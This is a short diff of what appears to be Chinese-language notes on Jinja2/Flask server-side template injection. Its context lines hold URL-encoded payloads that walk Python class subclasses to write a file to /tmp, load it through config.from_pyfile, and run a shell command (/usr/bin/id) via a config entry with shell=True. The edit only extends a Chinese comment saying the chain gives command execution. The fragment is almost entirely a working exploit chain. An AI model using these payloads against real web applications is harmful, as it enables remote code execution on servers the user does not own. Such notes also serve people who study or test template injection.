@@ -22,4 +22,4 @@ name=%7B%7B ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').
 name=%7B%7B config.from_pyfile('/tmp/owned.cfg') %7D%7D 
 name=%7B%7B%20config[%27RUNCMD%27](%27/usr/bin/id%27,shell=True)%20%7D%7D
 ```
-大概就是写了一个配置？然后导入，就能命令执行了
+大概就是写了一个配置？然后导入，就能命令执行了，这是一个新的
